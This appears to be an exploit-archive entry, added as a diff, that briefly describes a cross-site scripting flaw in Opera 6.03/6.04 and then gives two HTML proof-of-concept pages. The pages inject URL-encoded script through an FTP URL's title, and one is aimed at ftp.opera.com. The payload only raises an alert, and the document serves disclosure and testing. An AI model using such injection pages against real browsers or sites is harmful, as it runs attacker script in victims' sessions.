@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/5401/info
+
+A cross-site scripting vulnerability in Opera has been reported. When viewing the contents of an FTP site as web content, the data within <title> tags is not sanitized. An attacker may embed javascript between open and closing <title> tags in a FTP URL. 
+
+This vulnerability has been confirmed on Opera 6.03 and 6.04 for Windows 2000.
+
+<html>
+<head>
+<META http-equiv="Refresh" content="5 ;
+url=ftp://%3c%2ftitle%3e%3cscript%3ealert(%22exploit%22)%3b%3c%2fscript%3e@[FTPserver]/">
+</head>
+<body>
+<script>window.open("ftp://[FTPserver]/");</script>
+</body>
+</html>
+
+Example:
+<html>
+<head>
+<META http-equiv="Refresh" content="5 ;
+url=ftp://%3c%2ftitle%3e%3cscript%3ealert(%22exploit%22)%3b%3c%2fscript%3e@ftp.opera.com/">
+</head>
+<body>
+<script>window.open("ftp://ftp.opera.com/");</script>
+</body>
+</html>
